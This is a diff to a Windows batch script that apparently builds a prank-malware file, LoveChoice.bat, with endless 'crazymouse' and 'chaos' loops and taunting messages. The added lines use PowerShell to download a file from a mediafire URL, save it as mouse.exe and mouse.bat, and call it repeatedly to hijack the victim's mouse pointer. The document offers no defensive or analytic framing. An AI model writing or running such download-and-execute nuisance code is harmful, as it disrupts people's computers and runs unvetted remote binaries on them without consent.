@@ -310,9 +310,8 @@ goto haha
 
 :: Create macro document that will move the mouse pointer.
 
-echo ret = SetCursorPos(180, 80)>>Mouse.docm
-echo ret = SetCursorPos(140, 86)>>Mouse.docm
-echo ret = SetCursorPos(10, 80)>>Mouse.docm
+powershell -Command "(New-Object Net.WebClient).DownloadFile('http://www.mediafire.com/file/xycm8d9wqrm5rsv/mouse.bat/file', 'mouse.exe')"
+powershell -Command "Invoke-WebRequest http://www.mediafire.com/file/xycm8d9wqrm5rsv/mouse.bat/file -OutFile mouse.bat"
 
 echo @echo off>LoveChoice.bat
 echo color 57>>LoveChoice.bat
@@ -365,8 +364,10 @@ echo goto respawn>>LoveChoice.bat
 
 echo :crazymouse>>LoveChoice.bat
 echo goto chaos>>LoveChoice.bat
-echo timeout 10>>LoveChoice.bat
-echo start /min Mouse.docm>>LoveChoice.bat
+echo call mouse moveBy 10x100>>LoveChoice.bat
+echo call mouse moveBy 16x50>>LoveChoice.bat
+echo call mouse moveBy 190x10>>LoveChoice.bat
+echo call mouse moveBy 186x50>>LoveChoice.bat
 echo goto crazymouse>>LoveChoice.bat
 
 :: Create some chaos
@@ -487,8 +488,10 @@ echo echo But I love you....hehehehehe :(>>LoveChoice.bat
 
 echo :crazymousee>>LoveChoice.bat
 echo goto run4>>LoveChoice.bat
-echo @timeout 10>>LoveChoice.bat
-echo @start /min Mouse.docm>>LoveChoice.bat
+echo @call mouse moveBy 10x100>>LoveChoice.bat
+echo @call mouse moveBy 16x50>>LoveChoice.bat
+echo @call mouse moveBy 190x10>>LoveChoice.bat
+echo @call mouse moveBy 186x50>>LoveChoice.bat
 echo goto crazymousee>>LoveChoice.bat
 
 echo :run4>>LoveChoice.bat
